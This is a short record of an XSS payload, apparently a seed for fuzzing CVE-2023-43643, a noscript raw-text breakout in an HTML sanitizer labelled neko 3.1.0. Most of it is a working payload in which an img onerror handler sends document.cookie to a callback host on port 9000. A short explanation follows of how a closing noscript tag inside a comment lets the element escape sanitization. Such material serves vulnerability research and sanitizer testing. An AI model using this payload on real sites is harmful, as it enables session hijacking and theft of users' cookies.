ORIGINAL PAYLOAD (CVE-2023-43643 seed -- raw-text element noscript breakout)
=============================================================================
<div><noscript><!--</noscript><img src=x onerror="document.location='//callback:9000/c?f='+document.cookie">--></div>

Vector: the </noscript> inside the comment prematurely closes the raw-text region on
neko 3.1.0, so the <img onerror> escapes as a live element.

